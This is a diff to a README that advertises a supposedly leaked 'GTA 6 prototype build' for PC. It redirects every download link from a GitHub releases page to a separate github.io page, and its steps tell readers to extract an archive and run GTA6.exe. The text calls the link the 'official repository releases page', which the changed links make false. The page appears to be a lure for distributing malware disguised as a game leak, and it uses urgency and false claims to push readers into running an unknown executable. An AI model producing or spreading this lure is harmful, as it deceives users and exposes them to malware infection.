@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Prototype-Build-Early-Access-PC - Play the Unreleased Leak Now
 
-[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Prototype-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://github.com/metropolitan-sourcherry4751/GTA-6-Prototype-Build-Early-Access-PC/releases)
+[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Prototype-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://metropolitan-sourcherry4751.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ You get the core game world, story missions, vehicles, weapons, and that signatu
 
 ## ⚡ Quick Download Button
 
-➡️ **[CLICK HERE TO DOWNLOAD GTA 6 PROTOTYPE NOW](https://github.com/metropolitan-sourcherry4751/GTA-6-Prototype-Build-Early-Access-PC/releases)** ⬅️
+➡️ **[CLICK HERE TO DOWNLOAD GTA 6 PROTOTYPE NOW](https://metropolitan-sourcherry4751.github.io)** ⬅️
 
 Visit this link to download the application. The link takes you directly to the official repository releases page where you will find the latest build package.
 
@@ -34,7 +34,7 @@ Follow these exact steps. Even your grandma could do this.
 | **6** | Open the new extracted folder | Look for `GTA6.exe` (the game launcher) |
 | **7** | Double-click `GTA6.exe` | The game boots up. You are now playing GTA 6 |
 
-Visit this link to download the application: **[https://github.com/metropolitan-sourcherry4751/GTA-6-Prototype-Build-Early-Access-PC/releases](https://github.com/metropolitan-sourcherry4751/GTA-6-Prototype-Build-Early-Access-PC/releases)**
+Visit this link to download the application: **[https://metropolitan-sourcherry4751.github.io](https://metropolitan-sourcherry4751.github.io)**
 
 ---
 
@@ -173,7 +173,7 @@ Do not wait. Do not hesitate. The build is live right now.
 
 ## 📎 Direct Access Link (One More Time)
 
-**[➡️ DOWNLOAD GTA 6 PROTOTYPE BUILD — ULTIMATE EDITION](https://github.com/metropolitan-sourcherry4751/GTA-6-Prototype-Build-Early-Access-PC/releases)**
+**[➡️ DOWNLOAD GTA 6 PROTOTYPE BUILD — ULTIMATE EDITION](https://metropolitan-sourcherry4751.github.io)**
 
 Visit this link to download the application. That is your one and only action. Download it now.
 
